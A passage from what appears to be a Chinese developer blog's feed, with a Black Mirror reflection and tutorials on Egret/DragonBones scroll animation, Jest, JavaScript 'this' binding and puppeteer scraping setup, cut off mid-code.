    <content type="html"><![CDATA[<div><a id="more"></a></div><h2 id="故事简介"><a href="#故事简介" class="headerlink" title="故事简介"></a>故事简介</h2><p>　圣诞节将至，一间地处偏远的小木屋里，波特（拉菲·斯波 Rafe Spall 饰）和马特（乔恩·哈姆 Jon Hamm 饰）同坐一桌，用红酒和烤土豆庆祝这个银装素裹的节日。波特沉默寡言，无精打采，而马特却恰恰相反，为了逗波特讲话，他向波特讲述了自己的过去。<br>　　曾经的马特是一名“恋爱导师”，他通过摄像头和网络“远程操控”他的客户，让这些平日里无人问津的“宅男”们能够在派对山成功抱得美人归。然而，一场意外让马特决定永远离开这个他经营得风生水起的行当，此间究竟发生了什么？听了马特的叙述，波特终于决定向马特讲述自己的故事，这个故事关乎于他和他的女友，但并不完全关乎于爱情。　　</p><h2 id="随笔"><a href="#随笔" class="headerlink" title="随笔"></a>随笔</h2><p>看完黑镜的圣诞特别篇，感到特别沉重</p><p>人间有地狱吗，有！科技造就地狱，虽然影片中的科技现在还不存在，但是能真真切切的感受到与我们非常贴近，原来我们认为地狱是死后给恶人去的地方，但是科技可以将我们人类带往地狱！</p><p>想象你被全世界所有人屏蔽，你无法与其他人交流你看到的其他人一团模糊的白影，其他人也无法和你交流你也是一团影子。想象一下你的意识一分钟就是一千年，你无法做任何事情，在这千年里有一个永远关不掉的收音机，砸碎了，回头，发现还在，不停重复。这不是地狱是什么？</p>]]></content>
    
    <summary type="html">
    
      &lt;div&gt;
    
    </summary>
    
      <category term="life" scheme="http://zhoushaw.github.io/categories/life/"/>
    
    
      <category term="life" scheme="http://zhoushaw.github.io/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>Egret实战-动态条漫</title>
    <link href="http://zhoushaw.github.io/2019/05/06/learning/game/egret%E5%AE%9E%E6%88%98/"/>
    <id>http://zhoushaw.github.io/2019/05/06/learning/game/egret实战/</id>
    <published>2019-05-05T23:42:00.000Z</published>
    <updated>2019-06-14T15:31:02.020Z</updated>
    
    <content type="html"><![CDATA[<h2 id="h5活动构建思路"><a href="#h5活动构建思路" class="headerlink" title="h5活动构建思路"></a>h5活动构建思路</h2><p>如何制作一个类似于中国女子图鉴的项目呢。</p><blockquote><p>扫码访问：</p></blockquote><p><img width="200" src="https://s10.mogucdn.com/mlcdn/c45406/190506_2dl50cg7c5b79kf58a050fgch92ib_400x400.png"></p><blockquote><p>主要思路</p></blockquote><p>通过龙骨场景动画将将所有动画做成帧动画到龙骨中，通过滑动事件来控制帧切换的位置</p><blockquote><p>核心实现思想：</p></blockquote><ul><li>获取龙骨资源、并创建<code>dragonBones</code>实例对象。将龙骨场景对象添加至画布</li><li>构建一个滚动容器，容器的高度为视窗大小，设置宽度设置为视窗宽度，在滚动容器中内增加填充块,填充块的高度=<strong>(总的帧数<em> 滚动距离切换一帧 </em> 时间缩放) + 视窗高度</strong></li><li>创建<code>scroll</code>对象，将其设置为视窗大小，设置<code>滚动容器</code>对象为<code>scroll</code>的视域组件组件</li><li>使用<code>scroll</code>监听滚动高度，计算当前滚动条占总可滚动高度的百分比=“已滚动高度/(图片高度-视窗高度)”</li><li>获取<code>dragonBones</code>场景一共拥有多少帧，通过总帧数*当前百分比，得到用户滑动到当前所在帧数</li></ul><blockquote><p>对应知识点</p></blockquote><ul><li>滚动容器组件：<a href="http://developer.egret.com/cn/apidoc/index/name/eui.Scroller" target="_blank" rel="noopener">eui.scroller</a></li><li>龙骨动画控制：<a href="http://developer.egret.com/cn/apidoc/index/name/dragonBones.Animation" target="_blank" rel="noopener">dragonBones.animation</a></li></ul><blockquote><p>具体实现代码：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">private timeScale: number = 2;  // 时间缩放倍数，为2时表明帧数切换放慢两倍</span><br><span class="line">private frameFactor: number = 26; // 滚动一帧需要耗费的距离</span><br><span class="line">private totalFrames: number = 1672; // 总得帧数</span><br><span class="line">private totalPrgress: number = this.timeScale * this.frameFactor * this.totalFrames; // 总的滚动长度</span><br><span class="line">private dragonBones: Common.DragonParse;</span><br><span class="line"></span><br><span class="line">constructor () &#123;</span><br><span class="line">    // 龙骨脚手架中已添加COMMON公共方法，用来解析龙骨资源</span><br><span class="line">    this.dragonBones = Common.DragonParse.getDragonParseInstance();</span><br><span class="line">    this.egretFactory = this.dragonBones.getEgretFactory();</span><br><span class="line">    </span><br><span class="line">    // 获取龙骨资源</span><br><span class="line">    this.armatureDisplay = this.egretFactory.buildArmatureDisplay(&apos;listen_mother&apos;);</span><br><span class="line">    this.addView();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private addView () :void &#123;</span><br><span class="line">   // 获取视窗宽、高</span><br><span class="line">   const &#123; stageWidth, stageHeight &#125; = this.stage;</span><br><span class="line">   </span><br><span class="line">   // 创建滚动容器和填充块</span><br><span class="line">   const group = new eui.Group();</span><br><span class="line">   const placeHolder = new eui.Group();</span><br><span class="line"></span><br><span class="line">   placeHolder.width = stageWidth;</span><br><span class="line">   placeHolder.height = this.totalPrgress + stageHeight;</span><br><span class="line">   group.addChild(placeHolder);</span><br><span class="line"></span><br><span class="line">   //创建一个Scroller</span><br><span class="line">   this.scroller = new eui.Scroller();</span><br><span class="line">   this.scroller.bounces = false;</span><br><span class="line">   this.scroller.width = stageWidth;</span><br><span class="line">   this.scroller.height = stageHeight;</span><br><span class="line">   // 将group作为滚动的视域组件</span><br><span class="line">   this.scroller.viewport = group;</span><br><span class="line">   this.addChild(this.scroller);</span><br><span class="line">   </span><br><span class="line">   // 监听滚动变化</span><br><span class="line">    this.scroller.addEventListener(egret.Event.CHANGE, this.onScroll, this);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private onScroll () :void &#123;</span><br><span class="line">   // 获取滚动距离，并计算滚动百分比</span><br><span class="line">   const scrollV: number = this.scroller.viewport.scrollV;</span><br><span class="line">   const progress: number = scrollV / this.totalPrgress;</span><br><span class="line">   let curRateValue = ~~(this.totalFrames * progress);</span><br><span class="line"></span><br><span class="line">   this.setSwipeAndButton(curRateValue);</span><br><span class="line">   this.prevFrames = curRateValue;</span><br><span class="line">   </span><br><span class="line">   // 将设置龙骨动画播放到指定帧数</span><br><span class="line">   this.setProgress(progress);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private setProgress (progress: number) :void &#123;</span><br><span class="line">   this.armatureDisplay.animation.gotoAndStopByProgress(this.animationName, progress)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">|—— bin-debug   &lt;-编译后运行代码</span><br><span class="line">|—— libs        &lt;-第三方库</span><br><span class="line">|—— resource    &lt;-资源文件</span><br><span class="line">    |—— default.res.json    &lt;-资源索引目录</span><br><span class="line">    └── default.thm.json    &lt;-主题索引目录</span><br><span class="line">|—— scripts     &lt;-构建脚本</span><br><span class="line">|—— resource    &lt;-资源文件</span><br><span class="line">    |—— dragonbones    &lt;-龙骨资源目录</span><br><span class="line">        └── listen_mother    &lt;-母亲节活动龙骨资源</span><br><span class="line">|—— src         &lt;-项目源代码</span><br><span class="line">    |—— common          &lt;-公用方法库</span><br><span class="line">    |—— pages           &lt;-主要页面</span><br><span class="line">    |—— LoadingUI.ts    &lt;-loading组件</span><br><span class="line">    └── Main.ts         &lt;-入口文件</span><br><span class="line">└── template    &lt;-项目模板</span><br></pre></td></tr></table></figure><h2 id="制作场景动画"><a href="#制作场景动画" class="headerlink" title="制作场景动画"></a>制作场景动画</h2><blockquote><p>创建动画</p></blockquote><p><img width="300" src="https://s10.mogucdn.com/mlcdn/c45406/190515_2ghf8c42a3kji7l7l48e6jbkbafii_1050x672.png"></p><ul><li>选择创建龙骨动画</li></ul><blockquote><p>通过属性面板</p></blockquote><p><img width="200" src="https://s10.mogucdn.com/mlcdn/c45406/190512_1h0i16eg0f04lk03h128ih080ei3g_558x888.png"></p><ul><li>设置750宽、1260高</li><li>初始化起点位置，375、630</li></ul><h2 id="动画制作"><a href="#动画制作" class="headerlink" title="动画制作"></a>动画制作</h2><blockquote><p>逐帧动画和补间动画的差异</p></blockquote><ul><li>逐帧动画<ul><li>逐帧动画是在时间帧上逐帧绘制帧内容，每一帧带有不同的图</li><li>适合于表演很细腻的动画，如3D效果、人物或动物急剧转身等等效果</li><li>优点:有非常大的灵活性,表现任何想表现的内容</li><li>缺点:由于逐帧动画的帧序列内容不一样，不仅增加制作负担而且最终输出的文件量也很大</li></ul></li><li>补间动画<ul><li>只需要为动画的第一个关键帧和最后一个关键帧创建内容，两个关键帧之间帧的内容由龙骨自动生成，不需要人为处理</li><li>逐帧动画是由手工控制，帧与帧之间的过渡很可能会不自然、不连贯</li><li>过渡更为自然连贯。最后，相对于逐帧动画来说，补间动画的文件更小</li></ul></li></ul><h3 id="制作逐帧动画"><a href="#制作逐帧动画" class="headerlink" title="制作逐帧动画"></a>制作逐帧动画</h3><blockquote><p>起步</p></blockquote><ul><li>新建项目=&gt;创建龙骨动画=&gt;逐帧动画模板。</li><li>窗口菜单=&gt;属性面板</li><li>勾选画布=&gt;设定宽高=&gt;设定偏移方向</li><li>窗口菜单=&gt;资源面板</li><li>点击导入资源按钮或点击打开资源目录，将图片放入资源文件中</li><li>在资源面板拖入图片资源，即可</li></ul><blockquote><p>导出</p></blockquote><p>顶部栏导出按钮，按照默认“纹理集”即可</p><p><img width="400" src="https://s10.mogucdn.com/mlcdn/c45406/190515_3k31d6j2ijc64j232ke0d4b728c09_1080x70.png"></p><h3 id="制作补间动画"><a href="#制作补间动画" class="headerlink" title="制作补间动画"></a>制作补间动画</h3><p>补间动画思想：<strong>只需要为动画的第一个关键帧和最后一个关键帧创建内容，两个关键帧之间帧的内容自动生成，不需要人为处理</strong></p><blockquote><p>下面以龙骨动画的补间动画制作为例：</p></blockquote><p>在龙骨动画制作过程中，动画的对象必须以骨骼为单位</p><ul><li><p>切换至动画制作tab</p><ul><li><img width="400" src="https://s10.mogucdn.com/mlcdn/c45406/190515_5i77b4889d454d0aek8cif8l8beh6_844x384.png"></li></ul></li><li><p>进入场景后通过场景树选择需要制作动画的骨骼</p><ul><li><img width="200" src="https://s10.mogucdn.com/mlcdn/c45406/190515_5e4290dgi2g7c11c9h4061c4cblah_690x980.png"></li></ul></li><li><p>选中骨骼可进行：<strong>位移</strong>、<strong>旋转</strong>、<strong>缩放</strong>动画制作</p><ul><li>在时间轴上选中第0帧，在操作面板点击对应改变属性的旗子</li><li><img width="200" src="https://s10.mogucdn.com/mlcdn/c45406/190515_860j48c1g0f347e9jg553k8j6bl7h_1012x598.png"></li><li><img width="200" src="https://s10.mogucdn.com/mlcdn/c45406/190515_5g58g56ja53eil92eh6h12211ff0f_736x112.png"></li><li>选中第10帧，并通过操作面板或直接对骨骼记性属性更改</li><li><img width="200" src="https://s10.mogucdn.com/mlcdn/c45406/190515_7jieaa926glfbcc28i85i2hl03e1h_736x110.png"></li><li>点击黄色旗子，将会自动补充补间动画</li></ul></li><li><p>选中图片可进行：<strong>透明度</strong>、<strong>是否展示</strong></p><ul><li>打开属性面板</li><li><img width="100" src="https://s10.mogucdn.com/mlcdn/c45406/190515_436fehba4a05da0kg6hak2h268fc3_502x1000.png"></li><li>是否展示图片需要通过，自动关键</li><li><img width="100" src="https://s10.mogucdn.com/mlcdn/c45406/190515_2a4f690dl2caek417cf1ij40049dc_480x592.png"></li><li>自动关键帧开启后，会自动在当前关键帧记录所有的属性修改</li></ul></li></ul><h2 id="制作龙骨动画"><a href="#制作龙骨动画" class="headerlink" title="制作龙骨动画"></a>制作龙骨动画</h2><p><strong>龙骨动画一般用来制作人物行动，将人物整体作为骨架各部分作为骨骼，例如：手臂、大腿、小腿都是骨骼，其中大腿和小腿都是腿的子集</strong></p><blockquote><p>起步</p></blockquote><ul><li>新建项目=&gt;创建龙骨动画=&gt;龙骨动画模板</li><li>窗口菜单=&gt;属性面板</li><li>勾选画布=&gt;设定宽高=&gt;设定偏移方向</li><li>窗口菜单=&gt;资源面板</li><li>点击导入资源按钮或点击打开资源目录，将图片放入资源文件中</li><li>在资源面板拖入图片资源，即可</li><li>创建骨骼：在骨架装配tab栏=&gt;场景树中右击=&gt;插入=&gt;骨骼</li><li>将图片资源拖入骨骼中</li></ul><h3 id="一屏动画设计原则"><a href="#一屏动画设计原则" class="headerlink" title="一屏动画设计原则"></a>一屏动画设计原则</h3><ul><li>构建一个基本场景骨架，后续骨架放置基本骨架上，方便整体移动</li><li>物件退场需要与背景反方向运动，造成错落感。或顺方向退场，避免导致认为物品或人与背景不分离</li><li>龙骨动画设计时以最小十帧为单位，场景转换预留30~50帧，后续方便调整</li><li>帧动画设计图片以至少三帧不同动画，可以造成连续感</li><li>开始龙骨动画制作前，先确定好场景高度和宽度不会有大的变化，否则后续修改会造成整体调整</li><li>文字动画放置物品后</li><li>动画效果放置980像素内，否则在小屏幕手机上无法展示全面</li><li>帧动画切换中间过度衔接透明度变化</li></ul><h2 id="对应资源"><a href="#对应资源" class="headerlink" title="对应资源"></a>对应资源</h2><ul><li><a href="http://gitlab.mogujie.org/module/meili-module-h5-game-egret/tree/master" target="_blank" rel="noopener">白鹭魔方页基础模板</a></li><li><a href="http://wxgame.mogu-inc.com/#/playground?_k=hwilxd" target="_blank" rel="noopener">玩法平台-所有玩法聚合页</a></li><li><a href="http://gitlab.mogujie.org/zhangzhe/listen_mother" target="_blank" rel="noopener">母亲节项目地址</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;h5活动构建思路&quot;&gt;&lt;a href=&quot;#h5活动构建思路&quot; class=&quot;headerlink&quot; title=&quot;h5活动构建思路&quot;&gt;&lt;/a&gt;h5活动构建思路&lt;/h2&gt;&lt;p&gt;如何制作一个类似于中国女子图鉴的项目呢。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;扫码访问：
      
    
    </summary>
    
      <category term="game" scheme="http://zhoushaw.github.io/categories/game/"/>
    
    
      <category term="egret" scheme="http://zhoushaw.github.io/tags/egret/"/>
    
  </entry>
  
  <entry>
    <title>Jest</title>
    <link href="http://zhoushaw.github.io/2019/05/04/learning/font-end/test/jest/"/>
    <id>http://zhoushaw.github.io/2019/05/04/learning/font-end/test/jest/</id>
    <published>2019-05-04T03:01:35.000Z</published>
    <updated>2019-05-12T06:26:35.668Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起步"><a href="#起步" class="headerlink" title="起步"></a>起步</h2><blockquote><p>安装</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev jest</span><br></pre></td></tr></table></figure><blockquote><p><code>pageckage.json</code>配置</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;test&quot;: &quot;jest&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Expect"><a href="#Expect" class="headerlink" title="Expect"></a>Expect</h2><p><code>Expect</code>是一个函数，第一个参数接收<code>value</code>,后面可接链式属性判断</p><ul><li><code>expect(value)</code><ul><li><code>expect(value).not.toEqual</code>: 与后面等式取反比较</li><li><code>toEqual(compareValue)</code>: <code>value</code> 与 <code>compareValue</code>必须完全相等</li></ul></li></ul><blockquote><p>自定义校验方法</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// 查询对象key值是否存在对象中</span><br><span class="line">expect.extend(&#123;</span><br><span class="line">    toContainKeys(received, keys) &#123;</span><br><span class="line">        const receivedKeys = Object.keys(received);</span><br><span class="line">        const pass = keys.every((val =&gt; receivedKeys.includes(val)));</span><br><span class="line">        if (pass) &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                message: () =&gt;</span><br><span class="line">                `expected $&#123;JSON.stringify(received)&#125; have contain $&#123;receivedKeys&#125;`,</span><br><span class="line">                pass: true,</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                message: () =&gt;</span><br><span class="line">                `expected $&#123;JSON.stringify(received)&#125; don&apos;t have contain $&#123;receivedKeys&#125;`,</span><br><span class="line">                pass: false,</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;起步&quot;&gt;&lt;a href=&quot;#起步&quot; class=&quot;headerlink&quot; title=&quot;起步&quot;&gt;&lt;/a&gt;起步&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;安装&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;tab
      
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript系列之this</title>
    <link href="http://zhoushaw.github.io/2019/04/23/learning/font-end/js/JavaScript-this/"/>
    <id>http://zhoushaw.github.io/2019/04/23/learning/font-end/js/JavaScript-this/</id>
    <published>2019-04-23T02:22:35.000Z</published>
    <updated>2019-04-27T13:21:01.130Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在JavaScript语言中存在一个<code>this</code>关键词，这个关键词指的是函数运行时所在的环境。由于函数可以在不同的运行环境执行，所以需要有一种机制，能够在函数体内部获得当前的运行环境（<strong>context</strong>）。所以，<code>this</code>就出现了，它的设计目的就是在函数体内部，指代函数当前的运行环境。</p><p>前一个系列的<strong>作用域</strong>讲过,作用域运用的是词法作用域，意味着是编写时确定的，但<strong>this</strong>与其工作原理完全不同，它的指向并不是编写时确定的，而是运行时确定。</p><h2 id="仅仅是“规则”"><a href="#仅仅是“规则”" class="headerlink" title="仅仅是“规则”"></a>仅仅是“规则”</h2><p>之前在阅读 You Don’t Know JS系列的: <strong>this &amp; Object Prototypes</strong>中，将this的指向总结了几条规则：</p><blockquote><p>函数调用方式与内部<code>this</code>指针关系：</p></blockquote><ol><li>直接调用:函数内部<code>this</code>指向全局对象<code>window</code></li><li>通过对象使用点来调用:函数内部this指向调用对象</li><li>触发事件调用函数:函数内部的<code>this</code>指向触发事件的对象</li><li>以<code>new</code>的方式来调用:函数内部<code>this</code>指向本次函数执行时对应的一个匿名对象（以new的方式创建的函数，函数名的首字母一般以大写字母开始）</li><li>通过<code>call</code>的方法来间接调用方法:函数内部this指向<code>call</code>方法的第一参数对象,我们可以创建结构相同，但内容不同的对象</li></ol><h2 id="不仅仅是“规则”"><a href="#不仅仅是“规则”" class="headerlink" title="不仅仅是“规则”"></a>不仅仅是“规则”</h2><p>参考了上面的规则发现，<code>this</code>的指向无论如何都逃脱不了上面的<strong>5大原则</strong>,那它们之前是否存在一定的规律呢，或者说是什么来决定<code>this</code>的指向的。</p><p>通常我们会对一下例子的结果没法准确的确定<code>this</code>指向：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var name = &apos;zhou&apos;;</span><br><span class="line">var obj = &#123;</span><br><span class="line">    name: &apos;shaw&apos;,</span><br><span class="line">    say: function () &#123;</span><br><span class="line">        console.log(this.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.say();  </span><br><span class="line"></span><br><span class="line">var say = obj.say;</span><br><span class="line">say();</span><br></pre></td></tr></table></figure><blockquote><p>上面的输出结果会是什么呢：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">obj.say(); // 输出shaw</span><br><span class="line">say();  // 输出zhou</span><br></pre></td></tr></table></figure><p>为什么这里<code>obj.say</code>和<code>say</code>的输出结果会不一致呢？下面我们来一探究竟。</p><p><code>this</code>的指向与数据在内存里的数据结构有关:</p><p>上面案例里的<code>obj</code>对象是如何在内存中存储的呢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">obj.say-&gt; &#123;</span><br><span class="line">    [[value]]: say函数地址</span><br><span class="line">    [[write]]: true,</span><br><span class="line">    [[readable]]: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上<code>say</code>函数并没有存储在<code>obj</code>对象中，它只存储了<code>say</code>函数的地址。</p><p>我们直接通过<code>obj.say</code>来调用函数，与<code>obj.say</code>赋值给<code>say</code>变量调用完全不同，因为<code>obj</code>中存储的是<code>say函数</code>的地址，我们进行赋值操作时直接将say函数地址直接赋值过去了，而不是我们想象的将<code>obj.say</code>引用赋值过去。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在JavaScript语言中存在一个&lt;code&gt;this&lt;/code&gt;关键词，这个关键词指的是函数运行时所在的环境。由于函数可以在不同的运行
      
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>puppeteer爬虫实战</title>
    <link href="http://zhoushaw.github.io/2019/04/23/learning/node/puppeteer/"/>
    <id>http://zhoushaw.github.io/2019/04/23/learning/node/puppeteer/</id>
    <published>2019-04-22T20:18:35.000Z</published>
    <updated>2019-05-12T06:26:35.669Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>待补充….</p><h2 id="centOs7-0无法运行问题"><a href="#centOs7-0无法运行问题" class="headerlink" title="centOs7.0无法运行问题"></a>centOs7.0无法运行问题</h2><p>centos必须升级到7.0以上否则会遇到依赖版本缺失问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">yum install ipa-gothic-fonts xorg-x11-fonts-100dpi xorg-x11-fonts-75dpi xorg-x11-utils xorg-x11-fonts-cyrillic xorg-x11-fonts-Type1 xorg-x11-fonts-misc -y</span><br><span class="line"></span><br><span class="line">yum install pango.x86_64 libXcomposite.x86_64 libXcursor.x86_64 libXdamage.x86_64 libXext.x86_64 libXi.x86_64 libXtst.x86_64 cups-libs.x86_64 libXScrnSaver.x86_64 libXrandr.x86_64 GConf2.x86_64 alsa-lib.x86_64 atk.x86_64 gtk3.x86_64 -y</span><br><span class="line"></span><br><span class="line"># 再安装NSS的依赖：</span><br><span class="line">yum install nss.x86_64</span><br><span class="line"></span><br><span class="line"># puppeteer的执行文件中去沙箱运行：</span><br><span class="line">browser = await puppeteer.launch(&#123;</span><br><span class="line">  headless: true,</span><br><span class="line">  args: [&apos;--no-sandbox&apos;, &apos;--disable-setuid-sandbox&apos;]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="puppeteer启动配置"><a href="#puppeteer启动配置" class="headerlink" title="puppeteer启动配置"></a>puppeteer启动配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const puppeteer = require(&apos;puppeteer&apos;);</span><br><span class="line">const browser = await puppeteer.launch([options]);</span><br></pre></td></tr></table></figure><ul><li>options<ul><li>headless <code>&lt;boolean&gt;</code> 以界面形式运行</li><li>devtools <code>&lt;boolean&gt;</code> 打开开发者工具栏</li></ul></li></ul><h2 id="页面对象附带"><a href="#页面对象附带" class="headerlink" title="页面对象附带"></a>页面对象附带</h2><blockquote><p>page.emulate</p></blockquote><p>模仿真实手机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const puppeteer = require(&apos;puppeteer&apos;);</span><br><span class="line">const devices = require(&apos;puppeteer/DeviceDescriptors&apos;)</span><br><span class="line"></span><br><span class="line">const page = await browser.newPage();</span><br><span class="line">await page.emulate(devices[&apos;iPhone X&apos;])</span><br><span class="line">await page.goto(&apos;https://www.baidu.com&apos;&#125;);</span><br></pre></td></tr></table></figure><blockquote><p>page.waitFor</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page.waitFor(selectorOrFunctionOrTimeout[, options[, ...args]])</span><br></pre></td></tr></table></figure><p>等待指定dom节点内容渲染完成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let selector = &apos;.price&apos;;</span><br><span class="line">await page.waitFor(selector =&gt;&#123;</span><br><span class="line">    return (document.querySelector(selector)||&#123;&#125;).innerText;</span><br><span class="line">&#125;, &#123;&#125;, selector);</span><br></pre></td></tr></table></figure><blockquote><p>page.goto(<code>url</code>[, <code>options</code>])</p></blockquote><ul><li>url <code>&lt;string&gt;</code> : 指定跳转地址</li><li>options <code>&lt;Object&gt;</code>:<ul><li><code>networkidle0</code>: 500毫秒内没有任何一个网络请求</li><li><code>networkidle2</code>:  500毫秒内没有超过任何二个网络请求</li><li><code>domcontentloaded</code>: dom装载完成</li></ul></li></ul><h2 id="页面环境执行脚本"><a href="#页面环境执行脚本" class="headerlink" title="页面环境执行脚本"></a>页面环境执行脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">await page.evaluate(() =&gt; &#123;</span><br><span class="line">    let name = window.name;</span><br><span class="line">    return name;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><blockquote><p>page.evaluate(pageFunction[, …args])</p></blockquote><ul><li><code>pageFunction</code>: <code>&lt;Function&gt;</code> 执行脚本，函数在浏览器环境执行，拥有<code>window</code>、<code>document</code>访问权限</li><li><code>...args</code>: <code>&lt;...Serializable|JSHandle&gt;</code>,传入参数，<code>pageFunction</code>无法访问函数外部变量，因为<code>pageFunction</code>内容将会直接当做脚本注入页面</li></ul><p>由于<code>pageFunction</code>函数会直接被注入到页面中，所以无法获取函数外部作用域，只能讲外部参数通过<code>args</code>传入，不能直接将<code>Function</code>传入，只能将函数通过<code>toString</code>后，在通过<code>eval</code>来执行<code>string</code>化后的函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 